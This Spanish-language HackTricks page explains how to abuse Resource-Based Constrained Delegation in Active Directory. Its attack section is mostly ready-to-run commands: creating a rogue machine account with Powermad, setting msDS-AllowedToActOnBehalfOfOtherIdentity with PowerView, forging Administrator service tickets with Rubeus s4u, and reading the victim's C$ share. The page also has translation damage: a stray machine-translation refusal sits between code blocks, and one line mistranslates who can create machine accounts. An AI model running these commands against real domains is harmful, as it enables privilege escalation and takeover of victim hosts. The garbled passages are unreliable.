# Delegación Restringida Basada en Recursos

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Fundamentos de la Delegación Restringida Basada en Recursos

Esto es similar a la [Delegación Restringida](constrained-delegation.md) básica pero **en lugar** de otorgar permisos a un **objeto** para **impersonar a cualquier usuario contra un servicio**. La Delegación Restringida Basada en Recursos **establece** en **el objeto quién puede impersonar a cualquier usuario contra él**.

En este caso, el objeto restringido tendrá un atributo llamado _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ con el nombre del usuario que puede impersonar a cualquier otro usuario contra él.

Otra diferencia importante de esta Delegación Restringida con las otras delegaciones es que cualquier usuario con **permisos de escritura sobre una cuenta de máquina** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) puede configurar el _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (En las otras formas de Delegación necesitabas privilegios de administrador del dominio).

### Nuevos Conceptos

En la Delegación Restringida se mencionó que la bandera **`TrustedToAuthForDelegation`** dentro del valor _userAccountControl_ del usuario es necesaria para realizar un **S4U2Self.** Pero eso no es del todo cierto.\
La realidad es que incluso sin ese valor, puedes realizar un **S4U2Self** contra cualquier usuario si eres un **servicio** (tienes un SPN) pero, si **tienes `TrustedToAuthForDelegation`** el TGS devuelto será **Forwardable** y si **no tienes** esa bandera el TGS devuelto **no** será **Forwardable**.

Sin embargo, si el **TGS** utilizado en **S4U2Proxy** **NO es Forwardable** intentando abusar de una **Delegación Restringida básica** **no funcionará**. Pero si estás intentando explotar una **delegación restringida basada en recursos, funcionará** (esto no es una vulnerabilidad, es una característica, aparentemente).

### Estructura del Ataque

> Si tienes **privilegios equivalentes a escritura** sobre una cuenta de **Computadora** puedes obtener **acceso privilegiado** en esa máquina.

Supongamos que el atacante ya tiene **privilegios equivalentes a escritura sobre la computadora víctima**.

1. El atacante **compromete** una cuenta que tiene un **SPN** o **crea una** (“Servicio A”). Nota que **cualquier** _Usuario Admin_ sin ningún otro privilegio especial puede **crear** hasta 10 **objetos de Computadora (**_**MachineAccountQuota**_**) y asignarles un **SPN**. Así que el atacante puede simplemente crear un objeto de Computadora y asignar un SPN.
2. El atacante **abusa de su privilegio de ESCRITURA** sobre la computadora víctima (ServicioB) para configurar **delegación restringida basada en recursos para permitir que el ServicioA impersone a cualquier usuario** contra esa computadora víctima (ServicioB).
3. El atacante usa Rubeus para realizar un **ataque S4U completo** (S4U2Self y S4U2Proxy) desde el Servicio A al Servicio B para un usuario **con acceso privilegiado al Servicio B**.
   1. S4U2Self (desde la cuenta comprometida/creada con SPN): Solicita un **TGS de Administrador para mí** (No Forwardable).
   2. S4U2Proxy: Usa el **TGS no Forwardable** del paso anterior para solicitar un **TGS** de **Administrador** para el **host víctima**.
   3. Incluso si estás usando un TGS no Forwardable, como estás explotando la delegación restringida basada en recursos, funcionará.
4. El atacante puede **pasar-el-ticket** e **impersonar** al usuario para obtener **acceso al ServicioB víctima**.

Para verificar el _**MachineAccountQuota**_ del dominio puedes usar:
```
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Ataque

### Creando un Objeto de Computadora

Puedes crear un objeto de computadora dentro del dominio usando [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```csharp
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Como no se proporcionó texto en inglés para traducir, no puedo realizar la traducción solicitada. Si proporcionas el texto en inglés relevante, estaré encantado de ayudarte con la traducción al español.
```bash
Get-DomainComputer SERVICEA #Check if created if you have powerview
```
### Configuración de la Delegación Restringida Basada en Recursos

**Usando el módulo de PowerShell activedirectory**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
![](../../.gitbook/assets/B2.png)

**Usando powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Realizando un ataque S4U completo

Primero, creamos el nuevo objeto Computer con la contraseña `123456`, así que necesitamos el hash de esa contraseña:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Esto imprimirá los hashes RC4 y AES para esa cuenta.\
Ahora, se puede realizar el ataque:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Puedes generar más tickets simplemente preguntando una vez usando el parámetro `/altservice` de Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Ten en cuenta que los usuarios tienen un atributo llamado "**No se puede delegar**". Si un usuario tiene este atributo en Verdadero, no podrás suplantar su identidad. Esta propiedad se puede ver dentro de bloodhound.
{% endhint %}

![](../../.gitbook/assets/B3.png)

### Accediendo

La última línea de comandos realizará el **ataque S4U completo e inyectará el TGS** del Administrador en el host víctima en **memoria**.\
En este ejemplo se solicitó un TGS para el servicio **CIFS** del Administrador, por lo que podrás acceder a **C$**:
```bash
ls \\victim.domain.local\C$
```
![](../../.gitbook/assets/b4.png)

### Abuso de diferentes tickets de servicio

Aprenda sobre los [**tickets de servicio disponibles aquí**](silver-ticket.md#available-services).

## Errores de Kerberos

* **`KDC_ERR_ETYPE_NOTSUPP`**: Esto significa que kerberos está configurado para no usar DES o RC4 y usted está proporcionando solo el hash RC4. Proporcione a Rubeus al menos el hash AES256 (o simplemente proporcione los hashes rc4, aes128 y aes256). Ejemplo: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Esto significa que la hora del ordenador actual es diferente de la del DC y kerberos no está funcionando correctamente.
* **`preauth_failed`**: Esto significa que el nombre de usuario + hashes proporcionados no están funcionando para iniciar sesión. Puede que haya olvidado poner el "$" dentro del nombre de usuario al generar los hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Esto puede significar:
* El usuario que está intentando suplantar no puede acceder al servicio deseado (porque no puede suplantarlo o porque no tiene suficientes privilegios)
* El servicio solicitado no existe (si pide un ticket para winrm pero winrm no está en funcionamiento)
* El fakecomputer creado ha perdido sus privilegios sobre el servidor vulnerable y necesita que se los devuelvan.

## Referencias

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><strong>Aprenda hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si desea ver su **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulte los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtenga el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únase al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígame** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparta sus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
